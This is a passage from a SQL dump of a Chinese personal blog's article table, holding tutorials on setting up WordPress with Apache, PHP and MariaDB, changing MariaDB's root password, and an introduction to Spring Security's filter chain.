127.0.0.1</code>获取到HTML文件，然后查看文件也可以验证是否安装成功。</p>\n<p><img src=\"https://oss.lilicould.cn/file/49a7d3e8-c79f-4bd2-b974-b5bbd8e566f5_image.png\" alt=\"\" /></p>\n<h4 id=\"测试php是否安装成功\">测试PHP是否安装成功</h4>\n<p>验证PHP是否成功，只要看访问页面时候PHP的API有没有成功调用就好了。我们到Apache的静态页面目录下创建一个test.php，然后写入测试代码，然后按照测试Apache的步骤访问127.0.0.1/test.php查看页面是否渲染成功之后就可以了。<br>\n接下来一步步展示</p>\n<ol>\n  <li>进入静态页面目录 <code>cd /var/www/html</code></li>\n  <li>创建test.php <code>sudo touch test.php</code></li>\n  <li>使用自己喜欢的编辑器（vi,vim,nano等）写入测试代码</li>\n</ol>\n<pre><code class=\"language-PHP\">&lt;?php\n  phpinfo();\n?&gt;\n</code></pre>\n<ol start=\"4\">\n  <li>访问127.0.0.1/test.php,如果出现以下类似页面，说明安装成功</li>\n</ol>\n<p><img src=\"https://oss.lilicould.cn/file/c015e3a5-31dd-49d0-80d6-a8c9388a21ce_image.png\" alt=\"\" /></p>\n<h4 id=\"测试mariadb是否安装成功\">测试MariaDB是否安装成功</h4>\n<p>连接mariadb,指令和MySQL几乎一致，使用root用户连接</p>\n<pre><code class=\"language-bash\">sudo mariadb -u root -p\n</code></pre>\n<p><img src=\"https://oss.lilicould.cn/file/36e94368-070b-4c66-926b-f716bb97237a_image.png\" alt=\"\" /><br>\n第一次的密码是Linux超级用户的密码，不加sudo就不会提示，第二次密码是提示输入数据库root用户的密码，由于现在还没有设置，所以密码为空，直接回车即可。<br>\n随后如果输出了welcom，说明正常连接了。</p>\n<p><img src=\"https://oss.lilicould.cn/file/4028f714-4c4f-4ce7-8852-3deede4e7626_image.png\" alt=\"\" /><br>\n接下来输入 <code>show databases;</code>展示数据库。</p>\n<p><img src=\"https://oss.lilicould.cn/file/485efc55-2d4f-413e-acc8-d81f2350c2e3_image.png\" alt=\"\" /><br>\n当看到这个页面时候说明数据库完美的安装了，没有任何问题，现在我们的环境都安装好了。</p>\n<hr />\n<h2 id=\"配置mariadb\">配置MariaDB</h2>\n<p>但是我们的MariaDB现在还没有任何配置，包括root账户的密码，这显然是不合适的。并且我们实际使用中显然也不会直接使用root用户，所以我们需要创建一个新的数据库用户，并为这个用户创建一个数据库供我们接下来要安装的WordPress使用。<br>\n接下来展示用户和数据库的创建与授权，root用户的密码可以不配置，如想配置可以自行配置或者查看<a href=\"https://lilicould.cn/article/67\">MariaDB初始用户密码配置</a>。</p>\n<h3 id=\"创建用户\">创建用户</h3>\n<pre><code class=\"language-sql\">create user yourName@localhost identified by \'yourPassword\'\n</code></pre>\n<p>其中@localhost表示这个用户只能本地连接，远程主机访问会拒绝，如果需要远程连接可以指定能连接的ip或直接使用通配符 <code>%</code>，但这样显然不安全。我们的数据库和使用环境在同一个主机，直接使用localhost不会有任何问题。<br>\n<strong>yourName和yourNmae注意替换为自己设置的用户名和密码</strong><br>\n密码可以按照老师教的使用古诗的拼音，也可以选择自己喜欢的密码。这里因为是在虚拟机上，就直接使用 <code>123456</code>了</p>\n<h3 id=\"创建数据库并授权\">创建数据库并授权</h3>\n<pre><code class=\"language-sql\">create database yourDatabaseName;\ngrant all privileges on yourDatabaseName.* to yourname@localhost;\nflush privileges;\n</code></pre>\n<p>第一条指令是创建一个名为 <code>yourDatabaseName</code>的数据库，实际中请改为自己的，这里我直接使用 <code>wordpress</code>作为数据库名。<br>\n第二条指令为把这个数据库的所有权限给予我们刚刚创建的用户。<br>\n<code>all privileges</code>代表所有权限，<code>yourDatabaseName.*</code>代表这个数据库的所有表。<br>\n第三条指令作用是让数据库立刻加载最新的用户、密码、权限配置，保证授权生效。</p>\n<h3 id=\"验证配置是否生效\">验证配置是否生效</h3>\n<p>我们可以使用exit关闭数据库连接，然后重新使用刚刚创建的用户连接检查是否能够成功连接，再展示所有数据库验证。<br>\n登陆指令和登陆root用户一样，将root改为刚刚创建的用户名即可。<br>\n登陆指令 <code>mariadb -u yourName -p</code><br>\n登陆后输入 <code>show databases;</code></p>\n<p><img src=\"https://oss.lilicould.cn/file/3326e407-d412-4482-8635-c5e24a2280ac_image.png\" alt=\"\" /><br>\n可以发现出现的数据库少了，这是因为这个用户只有刚刚授权的数据库权限，我这里数据库名是 <code>wordpress</code>。至于另一个 <code>information_schema</code>数据库，这是MariaDB的系统数据库，存储了数据库的信息，无需理会。<br>\n到这里我们就完成了PHP动态网站平台的搭建，接下来就可以安装部署WordPress了。</p>\n<hr />\n<h2 id=\"安装部署wordpress\">安装部署WordPress</h2>\n<p>wordpress官网提供了详细了说明，当然可以查阅<a href=\"https://developer.wordpress.org/advanced-administration/before-install/howto-install/\">官网安装教程</a>学习如何安装,但是官网教程是英文的，而且国内网络正常访问可能会有一点卡。如果不想看官网教程可以直接根据下面的步骤执行。</p>\n<h3 id=\"下载wordpess\">下载WordPess</h3>\n<p>下载方式有很多，可以直接去官网找到下载按钮下载，这里我们选择使用wget直接从官网下载地址安装。我们先进入到 <code>/var/www.html</code>目录（后续解压也要解压到这里，为了方便就直接进入这个目录操作），然后进行安装，具体操作展示：</p>\n<ol>\n  <li>进入 <code>/var/www/html</code>目录</li>\n</ol>\n<pre><code class=\"language-bash\">cd /var/www/html\n</code></pre>\n<ol start=\"2\">\n  <li>下载WordPress</li>\n</ol>\n<pre><code class=\"language-bash\">sudo wget https://wordpress.org/latest.tar.gz\n</code></pre>\n<p><img src=\"https://oss.lilicould.cn/file/3f757ee8-8bac-4d44-a499-9ab0791688dc_image.png\" alt=\"\" /></p>\n<p>可以看到我们成功下载了WordPress,然后直接解压就可以了。<br>\n直接在控制台中输入 <code>sudo tar -xzvf latest.tar.gz</code>解压，然后输入ls我们就应该可以看到在目录 <code>/var/www/html</code>目录下多出了wordpress目录</p>\n<p><img src=\"https://oss.lilicould.cn/file/043f81e5-036e-4b3f-8528-8716dd9a3ead_image.png\" alt=\"\" /></p>\n<h3 id=\"测试wordpress安装\">测试wordpress安装</h3>\n<p>接下来我们直接访问 <code>127.0.0.1/wordpress</code>应该就会出现以下界面</p>\n<p><img src=\"https://oss.lilicould.cn/file/0aeaffa3-d82a-4d71-a5e1-d2324144d1a0_image.png\" alt=\"\" /><br>\n这说明我们的wordpress确实安装成功了，接下来需要对其进行配置。</p>\n<h3 id=\"配置wordpress权限\">配置WordPress权限</h3>\n<p>我们需要把敢刚解压得到的 <code>wordpress</code>目录的所有者设置为 <code>www-data</code>。<br>\nwww-data 是 Linux 系统里的一个系统用户 / 用户组。<br>\n安装 Apache，系统会自动创建它，Apache 运行时，就是以www-data身份在跑，PHP也是跟着Apache一起，用 www-data 运行。<br>\n所以我们必须要把 <code>wordpress</code>目录的所有者设置为 <code>www-data</code>,这样服务器才有权限对其执行读写操作。<br>\n当然不论能不能理解这些都不重要，我们只需要明白现在必须执行一个指令：</p>\n<pre><code class=\"language-bash\">sudo chown -R www-data:www-data /var/www/html/wordpress\n</code></pre>\n<p>其中 <code>chown</code>的意思是改变所有者，<code>-R</code>代表递归设置，<code>www-data:www-data</code>中冒号前面的代表用户，冒号后面的代表用户组</p>\n<h3 id=\"wordpress其他配置\">WordPress其他配置</h3>\n<p>给予了权限之后，我们能重新访问<a href=\"127.0.0.1/wordpress\">127.0.0.1/wordpress</a>就可以对wordpress进行配置了。</p>\n<h3 id=\"语言配置\">语言配置</h3>\n<p>我们选择语言为中文，点击继续</p>\n<p><img src=\"https://oss.lilicould.cn/file/5fe697d4-a049-4445-a11e-906311f6d516_image.png\" alt=\"\" /></p>\n<h3 id=\"数据库配置\">数据库配置</h3>\n<p>然后就会跳转数据库配置。</p>\n<p><img src=\"https://oss.lilicould.cn/file/4d21655a-18f9-4816-89ea-31aba00afad3_image.png\" alt=\"\" /><br>\n数据库名为刚刚配置MariaDB时候的配置，这里我的是 <code>wordpress</code>，同样的，用户名和密码也是刚刚安装Maria时候配置的，数据库主机和表前缀使用默认的 <code>localhost</code>和 <code>wp_</code>就可以了。</p>\n<h3 id=\"站点信息配置\">站点信息配置</h3>\n<p>接下来我们点击提交后提示我们已经准备就绪了，继续就可以了。<br>\n再接下来就会提示我们配置网站信息，按照自己个性填写就好了。</p>\n<p><img src=\"https://oss.lilicould.cn/file/e4b1370b-f8b4-49e5-9a59-7604043d4dcd_image.png\" alt=\"\" /><br>\n填写后点击 <code>安装WordPress</code>就可以了。<br>\n注意这里的用户名和密码<strong>一定要记住</strong>，这是网站的管理员账号密码。</p>\n<h3 id=\"登陆wordpress\">登陆WordPress</h3>\n<p>完成了所有的配置之后就会提示我们去登陆了，使用刚刚配置的管理员账号密码登陆后台就可以了。登陆后就能看到WordPress的后台了。</p>\n<p><img src=\"https://oss.lilicould.cn/file/546859bd-eda4-4891-9cf3-777b3d88eebc_image.png\" alt=\"\" /></p>\n<hr />\n<h3 id=\"一些问题\">一些问题</h3>\n<h4 id=\"文章内容无法访问\">文章内容无法访问</h4>\n<p>如果出现404，有可能是因为链接格式的问题，可以去仪表盘设置里面把链接格式改为 <code>朴素</code></p>\n<p><img src=\"https://oss.lilicould.cn/file/dbe2064c-0c1d-42f0-a40b-5b9916ccaedb_image.png\" alt=\"\" /><br>\n改为朴素后一定要记得保存修改。</p>\n<h3 id=\"测试\">测试</h3>\n<h4 id=\"文字blog\">文字blog</h4>\n<p><img src=\"https://oss.lilicould.cn/file/d3511ef5-466c-4778-9a02-8540f05b644a_image.png\" alt=\"\" /></p>\n<h4 id=\"图片blog\">图片blog</h4>\n<p><img src=\"https://oss.lilicould.cn/file/06f2a8e3-4b88-477d-9382-e5239a02453e_image.png\" alt=\"\" /></p>\n<hr />\n<h2 id=\"结束\">结束</h2>\n<p>到这里我们就完成了大作业的基本内容，然后我们通过WordPress后台对网站进行个性化设计就可以了。</p>\n', 'https://oss.lilicould.cn/cover/bdd49734-6f52-4bb7-9bcb-0116ae89caaa_hero-3.png', 1, 101, 2, '2026-04-10 08:14:03', '2026-05-19 10:18:14', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (67, 'MariaDB初始用户密码更改', 'MariaDB-init-password-change', '之前做linux大作业时候安装了MariaDB，但是初始用户是没有设置密码的，本文介绍如何设置初始密码。', '# MariaDB初始用户密码更改\n\n对于MariaDB密码的修改，其实一行指令就可以了。直接连接输入设置密码的指令就可以了。\n真实服务器中，虽然root设置的是只有localhost可以连接，但是如果本机中有恶意程序，依旧会对数据库造成威胁。所以设置密码是有必要的。\n当然虚拟机无所谓了。\n\n## 查看版本\n首先输入`sudo mariadb -uroot`连接数据库，因为没有配置密码，所以会直接连接成功。（由于使用了sudo，所以会需要输入linux密码）\n\n![](https://lilicould.cn:8888/uploads/ecec67d6-97dc-4b3b-89a1-5c9429307a24.png)\n可以看到我这里的版本是·11.8.6·\n\n## 更改密码\n由于我的版本是10.4+，所以直接输入\n\n```sql\nALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'新密码\';\n```\n\n对于10.3及其以前的版本，则需要使用\n\n```sql\nSET PASSWORD FOR \'用户名\'@\'localhost\' = PASSWORD(\'新密码\');\nFLUSH PRIVILEGES; -- 刷新权限\n```\n老版本需要使用PASSWORD()函数给密码做加密处理，并需要刷新权限。\n\n## 验证\nexit退出后重新输入·mariadb -uroot -p·连接，会提示需要输入密码，使用刚刚设置的密码连接。\n\n![](https://lilicould.cn:8888/uploads/bf827304-2886-4fa9-ba77-aabfab0e84fe.png)\n成功连接。', NULL, 'https://lilicould.cn:8888/uploads/f6a89814-a7bf-4b70-9563-7377843f6be8.jfif', 1, 10, 2, '2026-04-10 22:32:38', '2026-05-19 09:33:09', 2, NULL, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (68, '系统学习Spring Security(一)', 'spring-security-study-1', 'SpringSecurity入门篇', '# 系统学习Spring Security(一)\n\n> 本文是 Spring Security 入门笔记，主要讲了：用 SpringBoot 搭好带 Web、security 和 thymeleaf 依赖的项目，测试默认登录（账号 user，密码在控制台）；介绍了 security 默认的保护功能、登录注销流程和安全防护；拆解了它的底层过滤器原理，还有默认用户密码的来源，以及怎么自定义账号密码，快速入门 Spring Security。\n\n---\n\n## 一. 创建初始项目\n\n### 1.创建项目\n\n使用 `SpringBoot`构建项目并选择 `web`、`spring-security`和 `thymeleaf`依赖。\n\n### 2. 创建模板\n\n1. 创建IndexController\n\n```java\npackage cn.lilicould.securitydemo.controller;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\n\n@Controller\npublic class IndexController {\n\n    @GetMapping(\"/\")\n    public String index() {\n        return \"index\";\n    }\n}\n\n```\n\n2. 创建thymeleaf模板\n\n```thymeleaf\n<html xmlns:th=\"http://www.thymeleaf.org\" lang=\"zh\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Hello Security!</title>\n</head>\n<body>\n    <a th:href=\"@{/logout}\">退出登录1</a>\n    <a href=\"/logout\">退出登录2</a>\n</body>\n</html>\n```\n\n> 使用 `&lt;a th:href=\"@{/logout}\">退出登录1&lt;/a>`会自动处理上下文路径\n\n### 测试\n\nSpringSecurity默认配置了登录认证\n\n![登录界面](https://lilicould.cn:8888/uploads/cdb570db-6fb8-44c8-9a51-cee7422190d8.png)\n\n密码在控制台\n\n![密码](https://lilicould.cn:8888/uploads/212c169e-2f2e-4d73-b68d-706f3aa6e5a8.png)\n\n---\n\n## 二. Spring Security默认做了什么\n\n- 保护应用程序URL，要求对应用程序的任何交互进行身份验证。\n- 程序启动时生成一个默认用户“user”。\n- 生成一个默认的随机密码，并将此密码记录在控制台上。\n- 生成默认的登录表单和注销页面。\n- 提供基于表单的登录和注销流程。\n- 对于Web请求，重定向到登录页面；\n- 对于服务请求，返回401未经授权。\n- 处理跨站请求伪造（CSRF）攻击。\n- 处理会话劫持攻击。\n- 写入Strict-Transport-Security以确保HTTPS。\n- 写入x-Content-Type-Options以处理嗅探攻击。\n- 写入CacheControl头来保护经过身份验证的资源。\n- 写入x-Frame-Options以处理点击劫持攻击。\n\n---\n\n## 三. Spring Security底层原理\n\n> Spring Security 本质上是一套 Servlet Filter 链的封装框架，它通过一系列可插拔的过滤器，对请求进行「认证→授权→安全防护」的流水线处理，最终决定请求是否能到达你的业务接口。但是我们更喜欢使用Spring管理Bean，于是我们也想将这些filter当成Bean交给容器管理。\n\n### 1. DelegatingFilterProxy（委托过滤器代理）\n\nDelegatingFilterProxy本身也是一个Filter，它是Tomcat能识别的标准Servlet Filter，也是Spring Security实现Filter交给Spring容器管理的核心桥梁。\n\n我们都知道，Filter是Servlet容器（比如Tomcat）层面的组件，生命周期由Tomcat管理，而Spring的Bean是由Spring IoC容器管理的，两者本身互不干涉。但我们希望Spring Security的过滤器能被Spring管理，方便依赖注入、灵活配置，DelegatingFilterProxy就解决了这个矛盾。\n\n它的核心作用就是“代理”：本身不处理任何安全业务逻辑，只负责接收Tomcat传递的请求，然后将请求委托给Spring容器中真正的过滤器Bean（也就是FilterChainProxy）去处理。\n\n简单理解就是，Tomcat启动时，会加载DelegatingFilterProxy这个Filter，以为它就是处理安全逻辑的过滤器；但实际上，DelegatingFilterProxy会从Spring容器中找到FilterChainProxy Bean，把所有请求都交给它，由FilterChainProxy去调用Spring Security的整个过滤器链（比如处理登录的UsernamePasswordAuthenticationFilter、处理登出的LogoutFilter等）。\n\n这样一来，我们就实现了“Filter由Tomcat加载，逻辑由Spring Bean处理”，既遵守了Servlet规范，又能享受Spring管理Bean的便利，这也是Spring Security底层能整合Spring容器的关键所在。\n\n结合我们刚才创建的项目来看，页面中写的th:href=\"@{/logout}\"退出登录请求，最终能被Spring Security的LogoutFilter处理，本质上就是通过DelegatingFilterProxy将请求转发给了Spring容器中的过滤器链，完成登出逻辑的执行。\n\n### 2. 原理图\n\n![](https://oss.lilicould.cn/file/99878c72-6aac-4717-9e3c-ab18ed5bc01b_657840c9-b3fb-4a76-bebb-4c94a55ab191.png)\n\n### 3. DefaultSecurityFilterChain（默认安全过滤器链）\n\n前面提到的FilterChainProxy，核心是管理一组SecurityFilterChain，而DefaultSecurityFilterChain就是SecurityFilterChain的默认实现类，也是Spring Security中「过滤器链的具体载体」。\n\n简单来说，DefaultSecurityFilterChain就是把我们之前说的“Spring Security过滤器链”（比如登录、登出、授权相关的过滤器），进行了封装，它包含两个核心部分，对应我们的项目实操场景，很好理解：\n查看源码构造函数：\n\n```java\npackage org.springframework.security.web;\n\n...\n\npublic final class DefaultSecurityFilterChain implements SecurityFilterChain, BeanNameAware, BeanFactoryAware {\n\n	private static final Log logger = LogFactory.getLog(DefaultSecurityFilterChain.class);\n\n	private final RequestMatcher requestMatcher;\n\n	private final List<Filter> filters;\n\n	public DefaultSecurityFilterChain(RequestMatcher requestMatcher, Filter... filters) {\n		this(requestMatcher, Arrays.asList(filters));\n	}\n\n	public DefaultSecurityFilterChain(RequestMatcher requestMatcher, List<Filter> filters) {\n		if (filters.isEmpty()) {\n			logger.debug(LogMessage.format(\"Will not secure %s\", requestMatcher));\n		}\n		else {\n			List<String> filterNames = new ArrayList<>();\n			for (Filter filter : filters) {\n				filterNames.add(filter.getClass().getSimpleName());\n			}\n			String names = StringUtils.collectionToDelimitedString(filterNames, \", \");\n			logger.debug(LogMessage.format(\"Will secure %s with filters: %s\", requestMatcher, names));\n		}\n		this.requestMatcher = requestMatcher;\n		this.filters = new ArrayList<>(filters);\n	}\n}\n...\n```\n\n可以发现有两个关键参数：\n\n1. 请求匹配器（RequestMatcher）：用于匹配当前请求的URL，决定当前过滤器链是否生效。比如我们项目中访问/logout、/等路径，会被默认的请求匹配器匹配，触发DefaultSecurityFilterChain中的过滤器执行。\n2. 过滤器集合（List&lt;Filter>）：就是Spring Security的一系列核心过滤器，比如处理登录的UsernamePasswordAuthenticationFilter、处理登出的LogoutFilter、处理授权的FilterSecurityInterceptor等，这些过滤器会按固定顺序依次执行，完成请求的认证和授权。\n\n结合底层流程补充说明：\n\n1. 当FilterChainProxy接收到DelegatingFilterProxy转发的请求后，会遍历它管理的所有SecurityFilterChain（默认就是DefaultSecurityFilterChain）；\n2. 通过DefaultSecurityFilterChain的请求匹配器，判断当前请求是否需要由该过滤器链处理；\n3. 如果匹配成功，就依次执行DefaultSecurityFilterChain中的所有过滤器，完成认证授权；如果匹配失败，就继续遍历下一个过滤器链（实际开发中默认只有一个DefaultSecurityFilterChain）。\n\n实际上DefaultSecurityFilterChain的过滤器集合（List&lt;Filter>）默认有16个，通过debug发现分别是：\n\n1. DisableEncodeUrlFilter - 禁用 URL 重写\n2. WebAsyncManagerIntegrationFilter - 异步请求集成\n3. SecurityContextHolderFilter - 安全上下文持有者\n4. ChannelProcessingFilter - 通道处理（HTTP/HTTPS）\n5. CsrfFilter - CSRF 防护\n6. LogoutFilter - 登出处理\n7. UsernamePasswordAuthenticationFilter - 用户名密码认证\n8. DefaultLoginPageGeneratingFilter - 默认登录页生成\n9. DefaultLogoutPageGeneratingFilter - 默认登出页生成\n10. RequestCacheAwareFilter - 请求缓存处理\n11. SecurityContextHolderAwareRequestFilter - 安全感知请求包装\n12. AnonymousAuthenticationFilter - 匿名认证\n13. SessionManagementFilter - 会话管理\n14. ExceptionTranslationFilter - 异常转换\n15. AuthorizationFilter - 授权检查\n16. FilterSecurityInterceptor - 安全拦截器\n\n---\n\n## 四. SecurityProperties\n\n查看源代码（去除注释，getter,setter和一些包引用版）：\n\n```java\n\npackage org.springframework.boot.security.autoconfigure;\n\nimport java.util.UUID;\n\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.util.StringUtils;\n\n@ConfigurationProperties(\"spring.security\")\npublic class SecurityProperties {\n\n    public final User user = new User();\n\n    public static class User {\n        public String name = \"user\";\n        public String password = UUID.randomUUID().toString();\n        public List<String> roles = new ArrayList<>();\n        public boolean passwordGenerated = true;\n\n        public void setPassword(String password) {\n            if (StringUtils.hasLength(password)) {\n                this.passwordGenerated = false;\n                this.password = password;\n            }\n        }\n    }\n}\n\n```\n\n可以看到这就是一个很寻常的 `Properties类`，发现使用了 `@ConfigurationProperties(\"spring.security\")`，于是我们只需要在配置文件中配置spring.security.xxx就可以自定义属性。可以看到默认的 `name`是 `user`，密码是通过UUID自动生成的，这就是我们刚刚登录时候的账号和密码。\n\n> `passwordGenerated`用于判断是否需要在控制台打印密码，当配置了密码是置为false。\n\n我们只需要在配置类中配置以下内容，就可以实现自定义账号密码了。\n\n```yaml\nspring:\n  security:\n    user:\n      name: yourname\n      password: yourpassword\n```\n\n当然实际上肯定会使用更多的自定义配置，例如自定义的登录实现，这些内容在后续部分。\n\n**下一章**：[系统学习Spring Security(二)](https://lilicould.cn/article/69)\n', '<h1 id=\"系统学习spring-security一\">系统学习Spring Security(一)</h1>\n<blockquote>\n  <p>本文是 Spring Security 入门笔记，主要讲了：用 SpringBoot 搭好带 Web、security 和 thymeleaf 依赖的项目，测试默认登录（账号 user，密码在控制台）；介绍了 security 默认的保护功能、登录注销流程和安全防护；拆解了它的底层过滤器原理，还有默认用户密码的来源，以及怎么自定义账号密码，快速入门 Spring Security。</p>\n</blockquote>\n<hr />\n<h2 id=\"一-创建初始项目\">一. 创建初始项目</h2>\n<h3 id=\"1创建项目\">1.创建项目</h3>\n<p>使用 <code>SpringBoot</code>构建项目并选择 <code>web</code>、<code>spring-security</code>和 <code>thymeleaf</code>依赖。</p>\n<h3 id=\"2-创建模板\">2. 创建模板</h3>\n<ol>\n  <li>创建IndexController</li>\n</ol>\n<pre><code class=\"language-java\">package cn.lilicould.securitydemo.controller;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\n\n@Controller\npublic class IndexController {\n\n    @GetMapping(&quot;/&quot;)\n    public String index() {\n        return &quot;index&quot;;\n    }\n}\n\n</code></pre>\n<ol start=\"2\">\n  <li>创建thymeleaf模板</li>\n</ol>\n<pre><code class=\"language-thymeleaf\">&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;zh&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Hello Security!&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;a th:href=&quot;@{/logout}&quot;&gt;退出登录1&lt;/a&gt;\n    &lt;a href=&quot;/logout&quot;&gt;退出登录2&lt;/a&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<blockquote>\n  <p>使用 <code>&amp;lt;a th:href=&quot;@{/logout}&quot;&gt;退出登录1&amp;lt;/a&gt;</code>会自动处理上下文路径</p>\n</blockquote>\n<h3 id=\"测试\">测试</h3>\n<p>SpringSecurity默认配置了登录认证</p>\n<p><img src=\"https://lilicould.cn:8888/uploads/cdb570db-6fb8-44c8-9a51-cee7422190d8.png\" alt=\"登录界面\" /></p>\n<p>密码在控制台</p>\n<p><img src=\"https://lilicould.cn:8888/uploads/212c169e-2f2e-4d73-b68d-706f3aa6e5a8.png\" alt=\"密码\" /></p>\n<hr />\n<h2 id=\"二-spring-security默认做了什么\">二. Spring Security默认做了什么</h2>\n<ul>\n  <li>保护应用程序URL，要求对应用程序的任何交互进行身份验证。</li>\n  <li>程序启动时生成一个默认用户“user”。</li>\n  <li>生成一个默认的随机密码，并将此密码记录在控制台上。</li>\n  <li>生成默认的登录表单和注销页面。</li>\n  <li>提供基于表单的登录和注销流程。</li>\n  <li>对于Web请求，重定向到登录页面；</li>\n  <li>对于服务请求，返回401未经授权。</li>\n  <li>处理跨站请求伪造（CSRF）攻击。</li>\n  <li>处理会话劫持攻击。</li>\n  <li>写入Strict-Transport-Security以确保HTTPS。</li>\n  <li>写入x-Content-Type-Options以处理嗅探攻击。</li>\n  <li>写入CacheControl头来保护经过身份验证的资源。</li>\n  <li>写入x-Frame-Options以处理点击劫持攻击。</li>\n</ul>\n<hr />\n<h2 id=\"三-spring-security底层原理\">三. Spring Security底层原理</h2>\n<blockquote>\n  <p>Spring Security 本质上是一套 Servlet Filter 链的封装框架，它通过一系列可插拔的过滤器，对请求进行「认证→授权→安全防护」的流水线处理，最终决定请求是否能到达你的业务接口。但是我们更喜欢使用Spring管理Bean，于是我们也想将这些filter当成Bean交给容器管理。</p>\n</blockquote>\n<h3 id=\"1-delegatingfilterproxy委托过滤器代理\">1. DelegatingFilterProxy（委托过滤器代理）</h3>\n<p>DelegatingFilterProxy本身也是一个Filter，它是Tomcat能识别的标准Servlet Filter，也是Spring Security实现Filter交给Spring容器管理的核心桥梁。</p>\n<p>我们都知道，Filter是Servlet容器（比如Tomcat）层面的组件，生命周期由Tomcat管理，而Spring的Bean是由Spring IoC容器管理的，两者本身互不干涉。但我们希望Spring Security的过滤器能被Spring管理，方便依赖注入、灵活配置，DelegatingFilterProxy就解决了这个矛盾。</p>\n<p>它的核心作用就是“代理”：本身不处理任何安全业务逻辑，只负责接收Tomcat传递的请求，然后将请求委托给Spring容器中真正的过滤器Bean（也就是FilterChainProxy）去处理。</p>\n<p>简单理解就是，Tomcat启动时，会加载DelegatingFilterProxy这个Filter，以为它就是处理安全逻辑的过滤器；但实际上，DelegatingFilterProxy会从Spring容器中找到FilterChainProxy Bean，把所有请求都交给它，由FilterChainProxy去调用Spring Security的整个过滤器链（比如处理登录的UsernamePasswordAuthenticationFilter、处理登出的LogoutFilter等）。</p>\n<p>这样一来，我们就实现了“Filter由Tomcat加载，逻辑由Spring Bean处理”，既遵守了Servlet规范，又能享受Spring管理Bean的便利，这也是Spring Security底层能整合Spring容器的关键所在。</p>\n<p>结合我们刚才创建的项目来看，页面中写的th:href=&quot;@{/logout}&quot;退出登录请求，最终能被Spring Security的LogoutFilter处理，本质上就是通过DelegatingFilterProxy将请求转发给了Spring容器中的过滤器链，完成登出逻辑的执行。</p>\n<h3 id=\"2-原理图\">2. 原理图</h3>\n<p><img src=\"https://oss.lilicould.cn/file/99878c72-6aac-4717-9e3c-ab18ed5bc01b_657840c9-b3fb-4a76-bebb-4c94a55ab191.png\" alt=\"\" /></p>\n<h3 id=\"3-defaultsecurityfilterchain默认安全过滤器链\">3. DefaultSecurityFilterChain（默认安全过滤器链）</h3>\n<p>前面提到的FilterChainProxy，核心是管理一组SecurityFilterChain，而DefaultSecurityFilterChain就是SecurityFilterChain的默认实现类，也是Spring Security中「过滤器链的具体载体」。</p>\n<p>简单来说，DefaultSecurityFilterChain就是把我们之前说的“Spring Security过滤器链”（比如登录、登出、授权相关的过滤器），进行了封装，它包含两个核心部分，对应我们的项目实操场景，很好理解：<br>\n查看源码构造函数：</p>\n<pre><code class=\"language-java\">package org.springframework.security.web;\n\n...\n\npublic final class DefaultSecurityFilterChain implements SecurityFilterChain, BeanNameAware, BeanFactoryAware {\n\n	private static final Log logger = LogFactory.getLog(DefaultSecurityFilterChain.class);\n\n	private final RequestMatcher requestMatcher;\n\n	private final List&lt;Filter&gt; filters;\n\n	public DefaultSecurityFilterChain(RequestMatcher requestMatcher, Filter... filters) {\n		this(requestMatcher, Arrays.asList(filters));\n	}\n\n	public DefaultSecurityFilterChain(RequestMatcher requestMatcher, List&lt;Filter&gt; filters) {\n		if (filters.isEmpty()) {\n			logger.debug(LogMessage.format(&quot;Will not secure %s&quot;, requestMatcher));\n		}\n		else {\n			List&lt;String&gt; filterNames = new ArrayList&lt;&gt;();\n			for (Filter filter : filters) {\n				filterNames.add(filter.getClass().getSimpleName());\n			}\n			String names = StringUtils.collectionToDelimitedString(filterNames, &quot;, &quot;);\n			logger.debug(LogMessage.format(&quot;Will secure %s with filters: %s&quot;, requestMatcher, names));\n		}\n		this.requestMatcher = requestMatcher;\n		this.filters = new ArrayList&lt;&gt;(filters);\n	}\n}\n...\n</code></pre>\n<p>可以发现有两个关键参数：</p>\n<ol>\n  <li>请求匹配器（RequestMatcher）：用于匹配当前请求的URL，决定当前过滤器链是否生效。比如我们项目中访问/logout、/等路径，会被默认的请求匹配器匹配，触发DefaultSecurityFilterChain中的过滤器执行。</li>\n  <li>过滤器集合（List&lt;Filter&gt;）：就是Spring Security的一系列核心过滤器，比如处理登录的UsernamePasswordAuthenticationFilter、处理登出的LogoutFilter、处理授权的FilterSecurityInterceptor等，这些过滤器会按固定顺序依次执行，完成请求的认证和授权。</li>\n</ol>\n<p>结合底层流程补充说明：</p>\n<ol>\n  <li>当FilterChainProxy接收到DelegatingFilterProxy转发的请求后，会遍历它管理的所有SecurityFilterChain（默认就是DefaultSecurityFilterChain）；</li>\n  <li>通过DefaultSecurityFilterChain的请求匹配器，判断当前请求是否需要由该过滤器链处理；</li>\n  <li>如果匹配成功，就依次执行DefaultSecurityFilterChain中的所有过滤器，完成认证授权；如果匹配失败，就继续遍历下一个过滤器链（实际开发中默认只有一个DefaultSecurityFilterChain）。</li>\n</ol>\n<p>实际上DefaultSecurityFilterChain的过滤器集合（List&lt;Filter&gt;）默认有16个，通过debug发现分别是：</p>\n<ol>\n  <li>DisableEncodeUrlFilter - 禁用 URL 重写</li>\n  <li>WebAsyncManagerIntegrationFilter - 异步请求集成</li>\n  <li>SecurityContextHolderFilter - 安全上下文持有者</li>\n  <li>ChannelProcessingFilter - 通道处理（HTTP/HTTPS）</li>\n  <li>CsrfFilter - CSRF 防护</li>\n  <li>LogoutFilter - 登出处理</li>\n  <li>UsernamePasswordAuthenticationFilter - 用户名密码认证</li>\n  <li>DefaultLoginPageGeneratingFilter - 默认登录页生成</li>\n  